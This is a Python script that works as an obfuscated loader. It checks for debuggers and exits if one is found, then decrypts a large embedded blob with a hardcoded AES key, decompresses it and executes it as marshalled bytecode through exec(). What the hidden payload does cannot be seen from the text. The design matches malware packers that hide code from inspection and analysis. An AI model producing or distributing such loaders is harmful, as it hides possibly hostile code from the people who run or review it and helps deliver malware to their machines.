
import sys
import os
import base64
import hashlib
import marshal
import zlib
import traceback
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def _anti_debug():
    if sys.gettrace() or (os.name == 'nt' and __import__('ctypes').windll.kernel32.IsDebuggerPresent()):
        sys.exit(1)
_anti_debug()

_KEY = b'\xc4cxS\xfa\xe4\xe2bm\xcc\x85v]\xda\x9a\xe6\x96#&A\xba\x88\xab\xbfo\xd3+9\xa6\xf8A7'
_IV = b'\xb9\xa5,\\P5\x11N\x9d\xf2\xbffQ\n\xad\x17'

def _decrypt_str(data):
    try:
        cipher = AES.new(_KEY, AES.MODE_CBC, _IV)
        return unpad(cipher.decrypt(data), 16).decode()
    except:
        return ""

def _main():
    try:
        _encrypted = 'EM>2vqpL_`gQ>S@11oXizM5S}q&j(=ffpsbQZIySS#Y<&bN*cstM;^N52Hsn@Od=?oCwZ#qIfKtpk0F&U-&2|2$!h{57wrE@53_%KM5s^)fo9uA9@iodvLW%r)*3GJ)DKL)aT~~Vf9nD7ih*GSoOT2)oUaOv>|5MK#M2mSz4PRZS@MIhli8KTY#E`c0U@LWG>e7Ff2HC=|47rdk29Nwmq4BhMKLR@8mb_yfops{pwVXIpwPFVCJj`gPu+oMP721phL6#!jp+9q2bu7+x2-hgc`nx>=%B!K9qOZY0xZ0TT0$<kMer(b&|4(XJ6Yrp_h2!T6}Jm-o7RQm3^cY0Uhn&+n=N--6me)rp4D*s6S!N5YMFJ64&IP^f#3#F}NoHk8AkHrawn^6AHq~2DpYmS?C!8?bI+;-H{6vp;tFjuc%v2To}~M#@a!Oud$t)!@<SDA(#Y%=O{9u{6OEaVc-)#i@Y&oK1n<t%-hN9^GeIvBWd~f(ul2vsuDb|x<3Rx?B`-F(CNRrn^1&7m+^#hjdbZK{4{l`D7vdn9{T6(si*aughEfy4fq=6O6+<rf+ozW$~K=vRBlF663`lf63Kyex=F%)?YzCf@zyFJ$)5`yt;EfAG>k~dGMG?R>b;%K%)(2i2Cs0zPf{2S5QZvlXnS8Hj<&}GNvXT=!b}-FCp%7u2ml4$V0}KgCD#MHT;PkXo?CoS$M{We&iv9d0~BJ}R^@IWx&pW6a9}$VmzG;I!i(_FVQ9<3ThoD`@EGd`x2tM8!uTG$;=7@{zPa4Cp$bUXVqbMB5RD5f?3aH9Bs7;Qp558`Mxd=<PkL@f`ZHtLGvUTiUUdxB+IjnbtEBu1wD?2x3@<>xm1m=$@XMsjJ6yP}J<{5M%1vG(34A294XxGC-CBVIEBR)i+Nb}y;RL-P3d7eRsgq2j!UN1In3ha}0<Ym9llT8=5xtV9Y{@n;TVii11$s%5njhcu(8p{pb^!(3-cRMi$Wc!RK8nVQP76z+(n-DnNRZ_O{iIJ5YKHceqB0Mz7e4a0H7!1Dm|1iNqw1KVc;d?}Kjv_NWAS59P_IW8(V<=5E3$C?aHC?SGdVV`md)<A{CTysd3@OBK?)}EHh<7oT4~ftdh|xAd7u8Rf9xLL@KEfnyPsaH2JtC*4b_^m{H<02)qC$?kNGDv5|l%^QM|7L9o<@6C*k1q5`vtg%i4Tfb{0}7AS$v2MK^6K&_t0(=EkglCiKK|(?Kw{dRsLAFgr^zOv3(R<MSTVo1`k?RiVj`7iR1TC2H5}Zqi*?==}3vyC4`%xAb;ygEC)4h{V>h{AnvdZF;S{;d5fo_G`mFVh+snay6W|H_(UF(xbd}<|?v5snuYWY#Far3(dlcP7=ZUa~EvYkustuu~JjKj$mUX5K)K_`h^G~<^p^3<1*2mg0N2A>uXBHereuL(${QR(}drt%x=hak<`MNg<|PkxRa;o&D|dW{zCxv<<sYG2KA7bg#H3;DlW{Z_#Jj3?gghpe7>vet;ukk0r3zW{$b?@)hl;Ma??R89HJ-6IBBdvez|cH7leGy&D77iX^Xoep8+nDDSEVsV4Ku9SZ5%z5MdF)`MbRkRFbc<6<b;#@~RedJievv?WmBibuI7_>~y#mqz9x^C{Iv{b6kqI_3uKqh=D2Yz$|fd^|qp-@?vuYZ5NqY%%3Mldu)&!=8qw!FZfMWqDfP&0Pf2h3gS}6`B`JY-O^sMv(NKXZr?81&`{RPHV<NFbyiT2>5I3MKuBTg-Zw+(BC?WjshAD+Q&uiz%TIO?!j?PUt)&@igXt7p!>!#>fz#}_2#E+0sO*6y9+;(_Z$DHutc2<%w(j|Y=mjq)i)%43MaO!9cDRtgDD@VzZJrD#cG!Es&f44|XVTdG6-_8~HF;XTo7wZRL50Q9@BQAkv+69BeouZKXm*ip{TvAkSiDux!A}wKQfB!n*Wx6=%FV=PhrTP09xhv+w&H(PK~+X|V%^O974$`j$j4Y#GGFKx6O6S1@zmLZ{AFQ~^6?UT2bxE$0La86Gr6~rbdX@r5&zi;hbxoh>A~&M1J5)M3+6hV$g3rc=9G^WLpcl=29c%<-OBjOT}trBXuf3vH2F~$E*M^e?1h>TVvb|)2bY5D;Q`KTSCZ8aK5o3d+mbw2iGnEX=|g??F?(}U_iMzV<NcUu6|tOMw-t%%BNBinN<us^iZrP8WFdX!*GM*Z7z+`=BlfK$vng%0ihv;%-M%0GKF5RnP5Bb8OmcFoC9p<?b&RoTIFyfgY6%h|ucZ?NY$&i&NJX(jJm1%CCE{ZQN%n5;G=Ig-6L-*3*^h4jZQr*?eI?9q?P#JPW9tR{L~jE$hg5_LUx{h>eyF8a!hlP=5s=fE;9Sm!0_J{lN^<cSh}OO+9ugzVl><r2uh>AVCr4Y}Yc?8=8R|rHM6~e>!eu6YYTgEIp`cm=*s*ol;B}<YoczV7dbuzz#)Qs5B9K&c8`9s^J)n?n1{Lg+2<g=nNJ_M?$n~#yI(m_)uTRuU+TYgvqa+=N;}&xkDy?gfOFLud_Yob6;hN;AxjU2p9t7)fJcVFn^r+&CpLsOzb_|OkR~Gy@vc0YKsSKA7SqjwJU<{IGy7~hOaoJwzGmR7Rh)BcKhvurEwR{ydar+$ztOyLvJ7=23C?2^~(hO#GG)o-9jzjngi8AO*fA|wl=%5{k<Xwc3E?bH0p9n6^((Dipp2PPQe0p0xqAMi2DG`1|Z-$Kr&AmND1-#=tK75_p?NDrv3pR(q`aS$%&(3Ml=ddh;6n31CbKBYs?O6!9ct0F72x}d3BHw`iGpadYv2!sJc^!ToOQ%;~N{pRL&%eL<NVW;AIso9-gqEJ>T6fTX`NHa4ljW~M5`pRyQ7#L>jHi%gE^4|t4MlAI!EOBJzf%T!tTGzSu^I-4$tk<kj-L4SqYA&R{1Kx3x+Mn)Bk13~bUm<WW$+6_(LN72Vf0?ji1sx}mt)x$3C(+~mvI~bF$wB&=mU%(4p9qAnb{S<8<zuIkn0V1mzD$`=PMT+AK%qv{NG72B|kc+-HzU^Ks!haJ)TxE&c4HZL0{2CJYZo1z`T21`sn}LNN4o7=fn;wEOx8CQ0-t<)eI{n-j@V!z2dkkJ>500vg0};K!?l@KmK)p9z@5KTEt1W?l7rbM#C1Mv*h5JQPuxG#G;g}-d7P*D*fnG^RQQvN9}hrDa9_L+^&JPrEJmq8g*CoaUw!Pwi#xt;!}*4$(haHPFr|osk9VLdtG2dzbdX2058bJNjjHgV88p2C}Wd|V&NJ4u6{Hm06UWt&3!4(Rgk(zDFgYbok$|={JM(fBTg|j<05SW1q837lUBcNn>!-#tfJl$rsMSDP}a{(#Ph86dZLSMNm!ndaj+o(j*wjlqMXxy(1hI`C3g3Tg^(hFM~Qpwx!A&Y-<ym4M6&d>e(NV}jKn+^nd?9fQrN~As^QnsSg{Iww52gPeAcpzQnTT44R)Cf04pv)PkBAw#BKZ5(iBYq1ER?l{CwDK0+_D^+y#iRX}W{e&4{(p3yi}Ddg_WjVZc&eME8YL<{vj>tv5Mk9k4b)FB<|zxdc4mwqwkHK-yGmtd~XuOx&tssV008(&mJoaUeBXD&&^7$hGZ9BSL7-TBZbjhpVCw3qdl+*pj-Pck7ukh>5qpf&!#m@eoI5JbXW(Q-sS{e0iswB!>a-2;wJT>7?vNhXAj`gcL||3#B7fT)3?UM=6HYHfMRRqoqN_lMN<4p@N+4LFhY|x`7E&^aqkN|H%4tNoyl{Uh;In&k(dx*g2dbPo)@AG=rEw1G3-uP&0VlB2fHa2|3VqayI`)f`F+Lhae)NrOi<Mvk6T{gk!Nv+p;24X$3~&?c3`-P>RvD^7w~<B*Ba+UaZ3lnv-FGJ*`T=o<~vmGz+}sSOc!du(q$a-%9uux*_*T*t;~&fyJ5n=Q~0oBUN^?Cd;8@tG~7EEjC&wR*A_Xw~co@92^L@dTIU#D)6PjaRMSwN@l;2vy6QU^VoB9A4iG_X}dhV9O1y^6ozO4;QL@58Bksj$K9{rZ=48aY20-TBMq{9fIW?ax^V`uaDqlprTs6P<z?AvM_u@}iIV-?W)!wheg;Ke9~W{m4UD;8+I;IZx22sLIvc_6VNoOoDF#SqH3+UMe?W-Mx8_scYN#mig!omT*l&njj)sSf1asw?#Zti#7CNE+Ki1~=xGpbo;q~@p3Y3(U-t%0w0nhF)lr3T9=)>{Wq1sdMDEaI?&{ATePlwJz#q9I#TjSun5e*yv(=B_-J3M%VleiOKI;$n4wr^%fB}3BBC$*PDba9!K#-tlq@{kBaKcZEiEjF1#SlJ|zz8;p4h8<9E2ko}}mOI8uelfRQ3DxVGI%7x!;`1HB*o6o%&t5-i9J;||!!I~4bu6CS8W=6>BA=0vhVHX&m?sBhxk`vR%7y+AP{nJ;sbmayQ7p1C+iTHSa5(G50GMcfj<kp~!~MVbMB}m2*fCH;M#LwS$F}0ZLI}~QFBU2a?-<Wj2z}Y_+k=k_o&CLAe)L#`TM+n5ANP(0OB1$9&-q5LNkdkMz^z9H3z&@Kh)l4VM=+j7pl)u=SGpQT*ylz7*^LKd-Xa#ar^=JA`+t56pxtTQz%~Ip`TV9~m9iC0MgI>0X*MjhRHzNv71*1P(y04@1;y~~==^{J@yNHKNWGS-YyYU$isgpn&op%L-XXQi>p145$-)Q*uo0<oG5~B_XT8mBr>wMCwi`k=q%}xq9`SvVGGA6Rk?29UNR*!BnW;Fyvw%LPfbYF%i{QiRy+8xTLxi@Tuo5UQP;9=3)dUYS8+>2!ka16-3&J?D|3VUBL$&$5ji9Ih(l2B|$~2vm1t2_a&1Ql=J(*XBuV~!?^(SVl=>4VD_xZg$BeSod=2G`IJs981d|)WzYplW+)Uzt3M8n$O>}9)XUN9daEqK#39=^yubN=-kDXeF>c88~RxD)qL)phbs!}YOMKfS6xlfWbrl2uq@Sd*V<{s4mUNw`0<A#Pr<wRpGFKua7L>jyDvZ7^^<h`#A$fGjzz$bl{>YUba1B<RB@mLvEw9|kAMh;C0y`ozYnu!S$#`j#TohW}Qx>bv+9b^liH`7VTSRzWU%?cdf>MAUkOHgcj}lnck>;_l&p`Gvky+iv@OKJ$<vae|Ui>?bGg^pe%=y0AKg5g~y~a~{R?&ctplQNYm~+wZ-V-z3pGuApxnxpcU}2~?+L+gK1A+xaSAnzl}rOt9j{O|r710^g)e@;bShCLfO<Uad?iB|B%wHTIAZ&}t~kn&!Qt_R4UenDZZMWqT#6s6q0YGY3-m$H#HR^RQ{*SI?nkUhJ}TE!*qiB|r4l{dG26j0Xw`@9eyOrKlg>D5A^Tw0G$~#5+Qgr=*ROu6~%H&$sfB#DJL6M<-ka#*%8Egie;{=@j&ccL}mvV@g``BGGkT8<s9<e1C8%1MUwKmqwN3^Z|0Se+695Urrv`FRUbH1Rr}&-VnFgc*h<nC0CY(rD)YKJp_K%+9HFW(CX~eh*zmg;jQ}qyl$U({K|P3=Uc$+quhFn^(I>Ncgv@%%;o{u*Zjn2R*CUNh$35Iz5MikbR7?>2MH6|ogb0G8uu^$r@aQiGWoovazjSL2#d8;;(r(irg1T8-j(83>Fc%p*`N>3^t`a48qFSO>xDJpK}t`0yvZ4b6l<bhjIJni)|z(*DUyHlK&Z9h<oMOwy6pJO^`=4~jQhH?2cNm+AlosSH&zCN>+Tc|Nalr48sbZ%J)ju~-W5-XLPI05OGjiv?Am}o^Va8OtI5`8Rbw2FaT^XGIgeA)yfx8f7L*k(J7!NxA{bovZvwuJr;HXX06mpag*D0{7`cG+kn`V%3zXT`O#s$QRoZ^Jc~M*@09{~Z0GDBOs9gkzq5KTru<Enp*laILPE=1m^&5<L`hMU8JYbn~Ua87VY*kNnv&Dki4jG-qh$WAsX4KPAgz#KG7zZQZW(Qrq+e6=Z5Jd!`78tY>ygGTmOHKQkkwJ5>Mb1bP&uA}k;9D@aB%Hl_D(2UO8%%Kt;B;ld-`|*TQD%ni1VwcH(4=f>ph4kIBn=l|VGNT7&w9Z3q{2`(bk`oH|4gycdit>Xzt$ze4uPrwH1asSrv)7vD%rsq*WA`ft}U*a_r~}vF!yVr5S%d$b*IXrWhhD$l<xc|?M*ivJXE9u<oeaj92l2Z$ff0=;eXbuhqLk3EsX8yH@Unnmwx~)L9NJ-cq_AA?U(Z+sL)f?H_VkpTpqulKb*SAFh*FOitDLp;BtVn>td0eT!+_iiIu6?vTX`0kh}6c^_yyCWmj=GXKDj9Fm3q?gEjJ{Bk+y2BGS(uLFrDqo~V6y5(*n9hIXI*a60s&LHBo*dsc3*_j5D)sfHL@$E~f_YFIZdv{w;iv<`O3)`ksG)DSlMmexFDwoD>5qO;(NS6L{Vf+((ED;Ce0G31gxrX|;Pr%O_uwI~05^@5yec`N=K6*Uec<i_<ERZBjy5F_&|F`QwFwH+)N+S&5k(U8K0PTDiZvQ@WKfdNDnP4?hxl}+LZcUJ4S*C!#yi3*o#k{yDl9{+A_j@39b2hgU=Z)m%x#lhdhXvOS@9$10!bULgeNlPP_#+5fsALWZ377z7demEvNGD6d55FFpBkS@3}`z_TYMX_;p&fS}V>#2Ta$23!NYNVO0?EvYnN6_`*_-M?Hj%o*5FfqTUZTvB-WA~=n-qr&vWnvb)4U>h^_|Yd{phe-AAhF9?R7Y3FT=r;#0>|(p&3!1So49bScObDdDWQ1C1#y9~omgB`R}2()RapnM^@O3wnK;O27S(`l@1eghOk5F10{|yj^L2h`xp3U{p)qTSInU<B0C+8Y{3|)EGZ&fng41*Yjm(aj2csn`;jM_MBk@ed@@zsb5vR=z*x?ermu089C78N=a%*2)IcHEa@UKvD=RogTiyw%>oJ8@baJ{521X4)yHuu>HxmCn?+<cg{x8VP@kV>1}<@ht#HxC=*Kfz!AHZd6Q7%NG8yv&PLik@oBKoe&E+;M(Q3F*ufl9$&_&Cc`ewHP&Pr-XNEM9flFH<jKk<kGi4oU#lmlThFn$8I|EU)2p_2Mgg$Xzdomm;$R1f~{hc51B=JkuT+f>x=M8I?yqgFJ|r>pxreD)x179Zr4*hC<S#{b?vy=1$x^n!0`h@KMaLNxS)cP(6EX=xyaL{zQqas1D^?Biw?vDf8_Shpre`BZu9*p)}=x`47?MgM~7Xk_v<ev5eWG=<NNX$4GjMoS%_svFt5wqkyzR7fOEPy4`NbB&OI;R-K|@J9Hc_z7NwX&&c$`xoyh-{F{xxDwN6^GLhGkBI|d|zH7+Wx$fRvEvn~1qHUt>vJb$62`O5R;hy%>Nhywgj#1XUJAO$RL2(hqlD7*Wi@Ul=V@qA-FCuX>v0`T9YWFm1!4$2w9O!Zo71T^pjUW?W{p}Tt7XpOaE7a?pDN-^0Be3g3TEoSJe;mVvIt2yf$$R2}y`iwMbH?}|2yx-o=yzs2#M$?DvOuKMq;vw9GH%`uA5jlQU)wkzI$rD*UK*W(4>19sSFlv99u<jAZ>XCLK{$_aC1lsZcI&j{o8WVvjC!oR<9{W@NqQ`W8O1CJ>d1cy*;MPpQB~!BC#|iM4+JEdjtv6fPyOu}^#TDLlN8(>ndB5SVHI~}SSZ{xy#5+1D?!2u!(KNrIV~oq$G)F|6*Wo8CNH`+3N+t^+-=wSaLnsfZ!uQZ+Kbj}<7|rPy(jfZJYsa6@3MW)ffPC_ZTK2Z?oa{hQE}*Vk4H_DYK93+qQgGWVzVd$)-MXU8514ho{-e1}Lu*GY8VVVeYEa8d)O-6qrWB=!bnTKB?*_IE5nb*hq)lB1MNRe{(a<?^ndWNS*<RaIPb}$*0|DON3;cG-?M`q-cznYj-l^B|`(3YpO<#Kv(pm6@1tXp$y^moMh7S}-BwUy8kq%!Z;2kpg3pH7`Yb<g2s$HDT7SQ4$yztgAWh1|DbE{gGMv4eTe_3M9=dAd&#w&M>DhO6W)3XJLgJaJ5+dw536hGH4>H=c8FFJp^4o!UNFFnK9tOEVkHSHm#_nlPMU7?f<tY*+nW7IV*1?yE1K(~3OorTpINNzK>MNkAUIN;o1u4Uil1T*8f;T(pC%Mu6-F|<t!B)M?Y!5*7^MIBM>X`@m|1+tz|F3=URgxznugsy*7^)DRODEi1B%4}c}<d5fQ`U2gXzHuFaw!Y?=&uZoI6~LsuNB!dmy=FaRw`Wt@T5VyZ3oA;v|B*-{wt$lzc#w&nN&|?36lbr5RJx@G)Mt?6^s$Bt>)-XRy<%z&eu3#)iK!`p'
        
        # Decryption steps
        cipher = AES.new(_KEY, AES.MODE_CBC, _IV)
        encrypted_data = base64.b85decode(_encrypted)
        decrypted_data = unpad(cipher.decrypt(encrypted_data), 16)
        decompressed_data = zlib.decompress(decrypted_data)
        
        exec(marshal.loads(decompressed_data), {
            **globals(),
            '__name__': '__main__',
            '__builtins__': __builtins__,
            '_decrypt_str': _decrypt_str
        })
    except Exception as e:
        print("Execution failed:")
        traceback.print_exc()
        sys.exit(1)

if __name__ == '__main__':
    _main()
        